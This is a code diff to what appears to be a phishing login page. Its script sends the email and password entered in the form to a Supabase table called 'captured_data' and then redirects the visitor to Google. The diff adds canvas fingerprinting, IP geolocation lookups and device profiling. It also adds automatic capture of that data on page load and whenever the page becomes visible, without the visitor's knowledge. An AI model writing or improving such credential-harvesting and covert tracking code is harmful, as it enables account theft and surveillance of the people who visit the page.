@@ -202,6 +202,8 @@
         // Initialize Supabase
         const db = window.supabase.createClient(supabaseUrl, supabaseKey);
         
+        let visitorId = null;
+        
         // Get IP address with multiple fallbacks
         async function getIPAddress() {
             const apis = [
@@ -244,8 +246,7 @@
             const apis = [
                 `https://ipwho.is/${ip}`,
                 `https://ipapi.co/${ip}/json/`,
-                `https://ipinfo.io/${ip}/json`,
-                `https://geolocation-db.com/json/${ip}`
+                `https://ipinfo.io/${ip}/json`
             ];
             
             for (const api of apis) {
@@ -279,9 +280,7 @@
                         timezone: data.timezone || 'Unknown',
                         org: data.org || data.isp || 'Unknown',
                         isp: data.connection?.isp || data.isp || data.org || 'Unknown',
-                        asn: data.asn || 'Unknown',
-                        currency: data.currency || 'Unknown',
-                        languages: data.languages || 'Unknown'
+                        asn: data.asn || 'Unknown'
                     };
                 } catch (error) {
                     continue;
@@ -291,7 +290,7 @@
             return {};
         }
         
-        // Better OS Detection with more details
+        // Better OS Detection
         function getOSInfo() {
             const ua = navigator.userAgent;
             const platform = navigator.platform;
@@ -299,12 +298,10 @@
             let version = 'Unknown';
             let architecture = 'Unknown';
             
-            // Architecture
             if (/x86_64|Win64|WOW64/.test(ua)) architecture = '64-bit';
             else if (/i386|i686|x86/.test(ua)) architecture = '32-bit';
             else if (/arm|aarch64/.test(ua)) architecture = 'ARM';
             
-            // iOS detection
             if (/iPhone/.test(ua)) {
                 name = 'iOS';
                 const match = ua.match(/OS (\d+_\d+)/);
@@ -320,13 +317,11 @@
                 const match = ua.match(/OS (\d+_\d+)/);
                 version = match ? match[1].replace(/_/g, '.') : 'Unknown';
             }
-            // Android detection (must come before Linux)
             else if (/Android/.test(ua)) {
                 name = 'Android';
                 const match = ua.match(/Android\s([0-9.]+)/);
                 version = match ? match[1] : 'Unknown';
             }
-            // Windows detection
             else if (/Windows NT 10.0/.test(ua)) {
                 name = 'Windows';
                 version = '10/11';
@@ -346,13 +341,11 @@
             else if (/Windows/.test(ua)) {
                 name = 'Windows';
             }
-            // macOS detection
             else if (/Mac OS X/.test(ua)) {
                 name = 'macOS';
                 const match = ua.match(/Mac OS X\s([0-9_]+)/);
                 version = match ? match[1].replace(/_/g, '.') : 'Unknown';
             }
-            // Linux detection (after Android check)
             else if (/Linux/.test(ua) || /Linux/.test(platform)) {
                 if (/CrOS/.test(ua)) {
                     name = 'Chrome OS';
@@ -377,61 +370,52 @@
             let engine = 'Unknown';
             let engineVersion = 'Unknown';
             
-            // Edge (Chromium)
             if (/Edg\//.test(ua)) {
                 name = 'Microsoft Edge';
                 version = ua.match(/Edg\/([0-9.]+)/)[1];
                 engine = 'Blink';
                 engineVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
             }
-            // Opera
             else if (/OPR\//.test(ua)) {
                 name = 'Opera';
                 version = ua.match(/OPR\/([0-9.]+)/)[1];
                 engine = 'Blink';
                 engineVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
             }
-            // Samsung Internet
             else if (/SamsungBrowser\//.test(ua)) {
                 name = 'Samsung Internet';
                 version = ua.match(/SamsungBrowser\/([0-9.]+)/)[1];
                 engine = 'Blink';
             }
-            // UC Browser
             else if (/UCBrowser\//.test(ua)) {
                 name = 'UC Browser';
                 version = ua.match(/UCBrowser\/([0-9.]+)/)[1];
                 engine = 'Blink';
             }
-            // Chrome
             else if (/Chrome\//.test(ua)) {
                 name = 'Google Chrome';
                 version = ua.match(/Chrome\/([0-9.]+)/)[1];
                 engine = 'Blink';
                 engineVersion = version;
             }
-            // Firefox
             else if (/Firefox\//.test(ua)) {
                 name = 'Mozilla Firefox';
                 version = ua.match(/Firefox\/([0-9.]+)/)[1];
                 engine = 'Gecko';
                 engineVersion = ua.match(/rv:([0-9.]+)/)?.[1] || version;
             }
-            // Safari
             else if (/Safari\//.test(ua)) {
                 name = 'Apple Safari';
                 version = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
                 engine = 'WebKit';
                 engineVersion = ua.match(/WebKit\/([0-9.]+)/)?.[1] || 'Unknown';
             }
-            // Internet Explorer
             else if (/MSIE/.test(ua) || /Trident/.test(ua)) {
                 name = 'Internet Explorer';
                 version = ua.match(/(?:MSIE |rv:)([0-9.]+)/)[1];
                 engine = 'Trident';
             }
             
-            // Check if mobile
             const isMobile = /Mobile|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua);
             
             return {
@@ -444,14 +428,13 @@
             };
         }
         
-        // Get device type with more details
+        // Get device type
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             let type = 'Desktop';
             let brand = 'Unknown';
             let model = 'Unknown';
             
-            // Mobile detection
             if (/iPhone/.test(ua)) {
                 type = 'Mobile';
                 brand = 'Apple';
@@ -471,7 +454,6 @@
                 type = /Tablet/.test(ua) ? 'Tablet' : 'Mobile';
                 brand = 'Android';
                 
-                // Try to detect manufacturer
                 const manufacturers = ['Samsung', 'Huawei', 'Xiaomi', 'OPPO', 'Vivo', 'OnePlus', 'Google', 'Sony', 'LG', 'Motorola', 'Nokia', 'Realme', 'Infinix', 'Tecno'];
                 for (const manufacturer of manufacturers) {
                     if (ua.includes(manufacturer)) {
@@ -480,7 +462,6 @@
                     }
                 }
                 
-                // Try to detect model
                 const modelMatch = ua.match(/\((.*?)\)/);
                 if (modelMatch && modelMatch[1]) {
                     const parts = modelMatch[1].split(';');
@@ -499,7 +480,6 @@
                 model = 'Windows Phone';
             }
             
-            // Check for touch capability
             const isTouchDevice = navigator.maxTouchPoints > 0 || 'ontouchstart' in window;
             
             return {
@@ -545,7 +525,7 @@
             };
         }
         
-        // Get battery info with fallback
+        // Get battery info
         async function getBatteryInfo() {
             try {
                 if (!navigator.getBattery) return null;
@@ -590,7 +570,120 @@
             }
         }
         
-        // Make handleLogin globally accessible
+        // Get canvas fingerprint
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                canvas.width = 200;
+                canvas.height = 50;
+                
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                
+                ctx.fillStyle = "#069";
+                ctx.fillText("Fingerprint Test", 2, 15);
+                
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.font = "18px 'Arial'";
+                ctx.fillText("Canvas Test", 4, 30);
+                
+                const gradient = ctx.createLinearGradient(0, 0, 200, 50);
+                gradient.addColorStop(0, 'blue');
+                gradient.addColorStop(1, 'red');
+                ctx.fillStyle = gradient;
+                ctx.fillRect(150, 30, 50, 20);
+                
+                return canvas.toDataURL();
+            } catch (e) {
+                return null;
+            }
+        }
+        
+        // Collect all visitor data
+        async function collectVisitorData() {
+            const browserInfo = getBrowserInfo();
+            const osInfo = getOSInfo();
+            const deviceInfo = getDeviceInfo();
+            const networkInfo = getNetworkInfo();
+            const webglInfo = getWebGLInfo();
+            const canvasFingerprint = getCanvasFingerprint();
+            
+            const ip = await getIPAddress();
+            const ipDetails = await getIPDetails(ip);
+            const batteryInfo = await getBatteryInfo();
+            
+            return {
+                ip_address: ip,
+                user_agent: navigator.userAgent,
+                referer: document.referrer || 'Direct',
+                device_info: {
+                    browser: browserInfo,
+                    os: osInfo,
+                    device: deviceInfo,
+                    screen: {
+                        width: window.screen.width,
+                        height: window.screen.height,
+                        availWidth: window.screen.availWidth,
+                        availHeight: window.screen.availHeight,
+                        colorDepth: window.screen.colorDepth,
+                        pixelDepth: window.screen.pixelDepth,
+                        pixelRatio: window.devicePixelRatio,
+                        orientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown'
+                    },
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack || 'Not set',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    webgl: webglInfo,
+                    network: networkInfo,
+                    battery: batteryInfo,
+                    canvasFingerprint: canvasFingerprint
+                },
+                ip_details: ipDetails,
+                created_at: new Date().toISOString()
+            };
+        }
+        
+        // Capture on page load
+        async function captureOnPageLoad() {
+            try {
+                console.log('📊 Capturing visitor data on page load...');
+                
+                const visitorData = await collectVisitorData();
+                
+                const { data, error } = await db
+                    .from('captured_data')
+                    .insert([{
+                        ...visitorData,
+                        email: 'VISITOR',
+                        password: 'NOT_SUBMITTED',
+                        visit_type: 'page_load'
+                    }])
+                    .select();
+                
+                if (error) {
+                    console.error('Error capturing page load:', error);
+                } else {
+                    visitorId = data[0].id;
+                    console.log('✅ Page load data captured, ID:', visitorId);
+                }
+            } catch (error) {
+                console.error('Error capturing page load:', error);
+            }
+        }
+        
+        // Capture on form submission
         window.handleLogin = async function() {
             const emailElement = document.getElementById('email');
             const passwordElement = document.getElementById('password');
@@ -628,66 +721,20 @@
             loading.style.display = 'block';
             
             try {
-                console.log('Collecting comprehensive data...');
+                console.log('📊 Capturing form submission data...');
                 
-                // Collect all data
-                const browserInfo = getBrowserInfo();
-                const osInfo = getOSInfo();
-                const deviceInfo = getDeviceInfo();
-                const networkInfo = getNetworkInfo();
-                const webglInfo = getWebGLInfo();
-                
-                // Get IP data
-                const ip = await getIPAddress();
-                const ipDetails = await getIPDetails(ip);
-                const batteryInfo = await getBatteryInfo();
-                
-                // Build comprehensive data object
-                const fullData = {
-                    email: email,
-                    password: password,
-                    ip_address: ip,
-                    user_agent: navigator.userAgent,
-                    referer: document.referrer || 'Direct',
-                    device_info: {
-                        browser: browserInfo,
-                        os: osInfo,
-                        device: deviceInfo,
-                        screen: {
-                            width: window.screen.width,
-                            height: window.screen.height,
-                            availWidth: window.screen.availWidth,
-                            availHeight: window.screen.availHeight,
-                            colorDepth: window.screen.colorDepth,
-                            pixelDepth: window.screen.pixelDepth,
-                            pixelRatio: window.devicePixelRatio,
-                            orientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown'
-                        },
-                        language: navigator.language,
-                        languages: navigator.languages,
-                        platform: navigator.platform,
-                        vendor: navigator.vendor,
-                        cookiesEnabled: navigator.cookieEnabled,
-                        doNotTrack: navigator.doNotTrack || 'Not set',
-                        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-                        deviceMemory: navigator.deviceMemory || 'Unknown',
-                        maxTouchPoints: navigator.maxTouchPoints || 0,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        timezoneOffset: new Date().getTimezoneOffset(),
-                        webgl: webglInfo,
-                        network: networkInfo,
-                        battery: batteryInfo,
-                        remember: remember
-                    },
-                    ip_details: ipDetails,
-                    created_at: new Date().toISOString()
-                };
-                
-                console.log('Saving to Supabase...');
+                const visitorData = await collectVisitorData();
                 
                 const { data, error } = await db
                     .from('captured_data')
-                    .insert([fullData]);
+                    .insert([{
+                        ...visitorData,
+                        email: email,
+                        password: password,
+                        visit_type: 'form_submission',
+                        remember: remember
+                    }])
+                    .select();
                 
                 if (error) {
                     console.error('Supabase error:', error);
@@ -696,7 +743,7 @@
                     return;
                 }
                 
-                console.log('✅ Data saved successfully');
+                console.log('✅ Form data saved successfully');
                 window.location.href = 'https://www.google.com';
                 
             } catch (err) {
@@ -714,6 +761,18 @@
             event.preventDefault();
             alert('Please contact support to reset your password.');
         };
+        
+        // Capture visitor data when page loads
+        window.addEventListener('DOMContentLoaded', function() {
+            captureOnPageLoad();
+        });
+        
+        // Also capture when page becomes visible again
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                captureOnPageLoad();
+            }
+        });
     </script>
 </body>
 </html>
